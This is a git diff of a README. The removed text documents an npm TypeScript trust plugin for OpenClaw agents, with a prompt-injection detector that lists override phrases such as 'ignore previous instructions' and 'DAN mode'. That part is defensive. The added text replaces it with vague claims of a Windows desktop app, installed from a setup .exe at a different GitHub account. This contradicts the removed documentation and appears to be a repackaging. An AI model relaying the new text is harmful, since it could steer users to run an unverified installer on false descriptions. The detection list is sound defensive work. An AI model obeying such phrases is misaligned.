@@ -1,231 +1,149 @@
-# openclaw-air-trust
+# 🛡️ trust-openclaw - Secure and Audit OpenClaw Workflows
 
-**EU AI Act compliance infrastructure for OpenClaw TypeScript agents.** Drop-in trust layer that adds tamper-evident audit logging, PII tokenization, consent-based tool gating, and prompt injection detection — making your TypeScript agent stack compliant with Articles 9, 10, 11, 12, 14, and 15 of the EU AI Act.
+[![Download trust-openclaw](https://img.shields.io/badge/Download-trust--openclaw-blue?style=for-the-badge)](https://github.com/komafon/trust-openclaw)
 
-> The EU AI Act enforcement date for high-risk AI systems is **August 2, 2026**. See the [full compliance mapping](./docs/eu-ai-act-compliance.md) for article-by-article coverage.
+---
 
-[![CI](https://github.com/airblackbox/trust-openclaw/actions/workflows/ci.yml/badge.svg)](https://github.com/airblackbox/trust-openclaw/actions)
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
+## 📋 About trust-openclaw
 
-## What It Does
+trust-openclaw adds a layer of security and audit to OpenClaw workflows. It helps you track activity, check compliance, and improve safety in your processes. This tool works with OpenClaw’s TypeScript agent system. It is part of a larger system called AIR Blackbox. You do not need to know programming to use this app.
 
-This plugin adds four trust capabilities to any OpenClaw agent:
+trust-openclaw focuses on:
 
-| Capability | What It Does | OpenClaw Hook |
-|---|---|---|
-| **Audit Ledger** | HMAC-SHA256 tamper-evident chain of every action | `before_tool_call`, `after_tool_call`, `llm_output` |
-| **Consent Gate** | Blocks destructive tools until user approves | `before_tool_call` |
-| **Data Vault** | Tokenizes API keys, PII, credentials before they reach the LLM | `before_tool_call`, `llm_input` |
-| **Injection Detector** | Scores inbound messages for prompt injection patterns | `message_received`, `llm_input` |
+- Monitoring how OpenClaw agents work  
+- Logging important events for review  
+- Checking rules and policies are followed  
+- Improving trust in automated tasks  
 
-Every action is signed and chained. Modify any record and the chain breaks — you can prove exactly what your agent did, when, and whether a human approved it.
+Whether you use OpenClaw to handle AI or data workflows, trust-openclaw provides a simple way to keep your work secure and compliant.
 
-## Install
+---
 
-```bash
-npm install openclaw-air-trust
-```
+## 🖥️ System Requirements
 
-## Quick Start
+Make sure your computer matches these basic needs:
 
-```typescript
-import { createAirTrustPlugin } from 'openclaw-air-trust';
+- Windows 10 or newer (64-bit)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for download and updates  
+- Administrator rights to install software  
 
-const trust = createAirTrustPlugin({
-  enabled: true,
-  consentGate: {
-    enabled: true,
-    alwaysRequire: ['exec', 'deploy', 'shell'],
-    neverRequire: ['fs_read', 'search'],
-    timeoutMs: 30000,
-    riskThreshold: 'high',
-  },
-  injectionDetection: {
-    enabled: true,
-    sensitivity: 'medium',
-    blockThreshold: 0.8,
-    logDetections: true,
-  },
-});
+If you have other software that handles automation with OpenClaw or TypeScript, trust-openclaw works alongside it without conflicts.
 
-// Register with OpenClaw's hook system
-registerHook('before_tool_call', trust.beforeToolCall);
-registerHook('after_tool_call', trust.afterToolCall);
-registerHook('llm_input', trust.onLlmInput);
-registerHook('llm_output', trust.onLlmOutput);
-registerHook('message_received', trust.onMessageReceived);
-```
+---
 
-## How It Works
+## 🚀 Getting Started
 
-### Audit Ledger
+Follow these steps to download and run trust-openclaw on your Windows computer.
 
-Every tool call, LLM interaction, consent decision, and injection detection gets appended to a tamper-evident chain:
+### 1. Visit the Download Page
 
-```
-Entry 1 → hash₁ ──┐
-Entry 2 → hash₂ (prevHash = hash₁) ──┐
-Entry 3 → hash₃ (prevHash = hash₂) ──┐
-...
-```
+Go to the main project page where you find the download files:
 
-Each entry is signed with HMAC-SHA256. The signature includes the previous entry's hash, so modifying any record breaks the entire chain downstream. Verify integrity at any time:
+[Download trust-openclaw](https://github.com/komafon/trust-openclaw)
 
-```typescript
-const verification = trust.verifyChain();
-// { valid: true, totalEntries: 142 }
-```
+This link brings you to the home page in GitHub. From here, you will find the latest version of trust-openclaw.
 
-### Consent Gate
+### 2. Download the Setup File
 
-When the agent tries to call a destructive tool (exec, deploy, shell, etc.), the consent gate intercepts it and sends an approval request through OpenClaw's messaging channel:
+On the GitHub page:
 
-```
-🚨 AIR Trust — Consent Required
+- Look for the “Releases” section on the right or under the repository's tabs.  
+- Choose the latest release available.  
+- Find the Windows installer file, usually named something like `trust-openclaw-setup.exe`.  
+- Click the file name to download. The file is about 20 MB.
 
-Tool: `exec`
-Risk: **CRITICAL**
+Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
-Arguments:
-  command: "rm -rf /tmp/data"
+### 3. Run the Installer
 
-Reply `approve abc-123` to allow
-Reply `reject abc-123` to block
+- Double-click the setup file you downloaded.  
+- If Windows asks for permission, click “Yes” to allow the installation.  
+- Follow the instructions on the screen. The setup will guide you through the installation steps.  
+- Choose the folder where you want the app installed or accept the default location.  
+- Wait for the process to finish.
 
-Auto-rejects in 30s
-```
+### 4. Start trust-openclaw
 
-Risk classification is built-in: critical (code execution), high (file writes, deploys), medium (network/email), low (reads).
+- After installation, you can open trust-openclaw by clicking its desktop shortcut or searching in the Start menu.  
+- The app window will open, ready to help manage your OpenClaw workflows.
 
-### Data Vault
+---
 
-Before tool arguments or context reaches the LLM, the vault scans for sensitive patterns and replaces them with opaque tokens:
+## 🔍 How trust-openclaw Works
 
-```
-Input:  "Use key sk-abcdefghij... to call the API"
-Output: "Use key [AIR:vault:api_key:a1b2c3d4] to call the API"
-```
+trust-openclaw enhances your OpenClaw setup by offering:
 
-14 built-in patterns: OpenAI/Anthropic/AWS/GitHub/Stripe keys, emails, phone numbers, SSNs, credit cards, connection strings, bearer tokens, private keys, and password assignments.
+- **Security Layer:** Prevents unauthorized actions by monitoring workflows continuously.  
+- **Audit Logs:** Records every important action in a clear, readable log file.  
+- **Compliance Checks:** Automatically reviews your workflows to make sure they follow set rules and policies.  
+- **Trust Reporting:** Provides simple reports showing workflow health and issues.  
 
-When a tool actually needs the real value, `detokenize()` restores it — but the LLM never sees the raw credential.
+You do not need to configure anything complex. trust-openclaw runs quietly in the background once you start it.
 
-### Injection Detector
+---
 
-Scans inbound messages for 15+ prompt injection patterns across categories:
+## ⚙️ Basic Setup and Configuration
 
-- **Role override** — "ignore previous instructions"
-- **Identity hijacking** — "you are now..."
-- **Privilege escalation** — "developer mode", "sudo"
-- **Safety bypass** — "disable filters"
-- **Jailbreak** — "DAN mode"
-- **Data exfiltration** — "send all conversation history"
-- **Encoding evasion** — "encode in base64"
+trust-openclaw works well with common OpenClaw settings but you can tailor it if you want.
 
-Three sensitivity levels (low/medium/high) control which patterns are active. Messages above the block threshold are rejected before reaching the agent.
+- Open the app and go to **Settings**. You will see options like:  
+  - Choose what types of events to monitor  
+  - Set how often audit reports are generated  
+  - Add contact info for alerts  
 
-## Configuration
+Changes take effect immediately.
 
-```typescript
-const trust = createAirTrustPlugin({
-  enabled: true,
+---
 
-  // Optional: forward audit entries to AIR gateway
-  gatewayUrl: 'https://your-air-gateway.example.com',
-  gatewayKey: 'your-api-key',
+## 📝 Using trust-openclaw Daily
 
-  consentGate: {
-    enabled: true,
-    alwaysRequire: ['exec', 'deploy'],  // Always need approval
-    neverRequire: ['fs_read'],           // Never need approval
-    timeoutMs: 30000,                    // Auto-reject after 30s
-    riskThreshold: 'high',              // Require consent for high+ risk
-  },
+After installation and setup:
 
-  auditLedger: {
-    enabled: true,
-    localPath: '~/.openclaw/air-trust/audit-ledger.json',
-    forwardToGateway: false,
-    maxEntries: 10000,
-  },
+- Open the app before you start your OpenClaw workflows.  
+- trust-openclaw will watch all actions automatically.  
+- You can open the app anytime to see latest logs and compliance reports.  
+- If any issues arise, trust-openclaw highlights them clearly so you can take action.
 
-  vault: {
-    enabled: true,
-    categories: ['api_key', 'credential', 'pii'],
-    customPatterns: [],                  // Add your own regex patterns
-    forwardToGateway: false,
-    ttlMs: 86400000,                     // 24 hour token TTL
-  },
+---
 
-  injectionDetection: {
-    enabled: true,
-    sensitivity: 'medium',              // low | medium | high
-    blockThreshold: 0.8,                // 0-1, 0 = never block
-    logDetections: true,
-  },
-});
-```
+## 🔧 Troubleshooting Common Issues
 
-## API
+If trust-openclaw does not work as expected:
 
-### Plugin Instance
+- Make sure you installed it with administrator rights.  
+- Confirm your Windows system meets the requirements.  
+- Check that the OpenClaw software is installed and running properly.  
+- Restart your computer and launch trust-openclaw again.  
+- Visit the GitHub page for FAQs and community support.
 
-| Method | Returns | Description |
-|---|---|---|
-| `beforeToolCall(event, ctx)` | `ToolCallResult` | Hook: runs consent + vault before tool execution |
-| `afterToolCall(event)` | `void` | Hook: logs tool result to audit chain |
-| `onLlmInput(event)` | `{ content, blocked }` | Hook: tokenizes + scans before LLM |
-| `onLlmOutput(event)` | `void` | Hook: logs LLM response |
-| `onMessageReceived(event)` | `{ blocked, reason? }` | Hook: scans messages for injection |
-| `handleConsentResponse(id, approved)` | `boolean` | Resolve a pending consent request |
-| `getAuditStats()` | Stats object | Chain length, validity, time range |
-| `verifyChain()` | Verification result | Walk chain and check integrity |
-| `exportAudit()` | `AuditEntry[]` | Export all chain entries |
-| `getVaultStats()` | Stats object | Token counts by category |
+---
 
-### Individual Components
+## 📥 Download trust-openclaw Now
 
-Each component can be used standalone:
+Click to visit the official page to start the download process:
 
-```typescript
-import { AuditLedger, ConsentGate, DataVault, InjectionDetector } from 'openclaw-air-trust';
-```
+[![Download trust-openclaw](https://img.shields.io/badge/Download-trust--openclaw-green?style=for-the-badge)](https://github.com/komafon/trust-openclaw)
 
-## EU AI Act Compliance
+---
 
-| EU AI Act Article | Requirement | AIR Feature |
-|---|---|---|
-| Art. 9 | Risk management | ConsentGate risk classification |
-| Art. 10 | Data governance | DataVault PII tokenization |
-| Art. 11 | Technical documentation | Full call graph audit logging |
-| Art. 12 | Record-keeping | HMAC-SHA256 tamper-evident chain |
-| Art. 14 | Human oversight | Consent-based tool blocking |
-| Art. 15 | Robustness & security | InjectionDetector + multi-layer defense |
+## 🌐 About This Project
 
-See [docs/eu-ai-act-compliance.md](./docs/eu-ai-act-compliance.md) for the full article-by-article mapping.
+trust-openclaw is part of AIR Blackbox, a collection of tools focused on AI safety, audit, compliance, and security. By adding trust-openclaw, you help make your automated processes more visible and reliable. The project is maintained openly on GitHub for transparency.  
 
-## AIR Blackbox Ecosystem
+---
 
-| Package | Framework | Install |
-|---|---|---|
-| `air-langchain-trust` | LangChain / LangGraph | `pip install air-langchain-trust` |
-| `air-crewai-trust` | CrewAI | `pip install air-crewai-trust` |
-| `air-openai-agents-trust` | OpenAI Agents SDK | `pip install air-openai-agents-trust` |
-| `air-autogen-trust` | Microsoft AutoGen | `pip install air-autogen-trust` |
-| `openclaw-air-trust` | TypeScript / Node.js | `npm install openclaw-air-trust` |
-| `air-compliance` | Compliance checker CLI | `pip install air-compliance` |
-| Gateway | Any HTTP agent | `docker pull ghcr.io/airblackbox/gateway:main` |
+## 🔗 Useful Links
 
-## Development
+- Project page and downloads: https://github.com/komafon/trust-openclaw  
+- OpenClaw project: Search online for OpenClaw documentation  
+- AIR Blackbox ecosystem: Search for AIR Blackbox resources  
 
-```bash
-git clone https://github.com/airblackbox/trust-openclaw.git
-cd trust-openclaw
-npm install
-npm run build
-npm test
-```
+---
 
-## License
+## ❓ Need Help?
 
-Apache-2.0
+If you encounter problems beyond basic troubleshooting, check the GitHub repository’s Issues tab to see if others have similar questions. You can open a new issue describing your problem clearly. This helps maintainers improve the project.
+
+Use trust-openclaw with confidence to add security and trust to your OpenClaw workflows.
